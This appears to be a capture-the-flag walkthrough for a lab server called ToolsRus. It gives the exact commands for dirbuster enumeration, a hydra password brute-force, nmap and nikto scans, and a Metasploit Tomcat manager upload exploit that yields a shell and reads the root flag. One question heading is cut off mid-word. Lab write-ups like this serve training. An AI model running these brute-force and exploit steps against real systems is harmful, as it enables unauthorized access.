# ToolsRus

## Practise using tools such as dirbuster, hydra, nmap, nikto and metasploit

# ToysRus

## Your challenge is to use the tools listed below to enumerate a server, gathering information along the way that will eventually lead to you taking over the machine.

### What directory can you find, that begins with a "g"?

1. Use dirbuster, there is only one directory that begins with "g"

```Bash
dirbuster
```

[SCREEN01]
[SCREEN02]

### Whose name can you find from this directory?

1. Just go to the endpoint

[SCREEN03]

### What directory has basic authentication?

1. In dirbuster results there is one results with status 401

[SCREEN02]

### What is bob's password to the protected part of the website?

1. Use hydra

```Bash
hydra -l bob -P /root/Desktop/wordlists/rockyou.txt <IP> http-get /protected
```

- `-l`: Single username specification
- `-P`: Password list file path

[SCREEN04]

### What other port that serves a webs service is open on the machine?

1. This will be the next one after 80

```Bash
nmap -p- -sV <IP>
```

- `-p-`: Allow us to scan all 65535 TCP ports
- `-sV`: Probes ports to determine service/version info

[SCREEN05]

### What is the name and version of the software running on the port from question 5?

It will be revealed after going to `http://<IP>:1234/`

[SCREEN06]

### Use Nikto with the credentials you have found and scan the /manager/html directory on the port found above. How many docume0

```Bash
nikto -h http://<IP>:1234/manager/html -id bob:b**s
```

- `-h`: specifies the host (including port if non-standard)
- `-id`: provides credentials in username:password format

[SCREEN07]

### What is the server version?

1. Use nikto on port 80

```Bash
nikto -h http://<IP>:80
```

- `-h`: Specifies the host target

[SCREEN08]

### What version of Apache-Coyote is this service using?

1. We have found the answer in our nmap enumeration

[SCREEN05]

### Use Metasploit to exploit the service and get a shell on the system. What user did you get a shell as?

1. Select the `multi/http/tomcat_mgr_upload`

```Bash
msfconsole
search tomcat
use 18
set RHOSTS <IP>
set RPORT 1234
set HttpUsername bob
set HttpPassword b**s
run
shell
id
```

[SCREEN09]

### What flag is found in the root directory?

```Bash
cat /root/flag.txt
```

[SCREEN10]
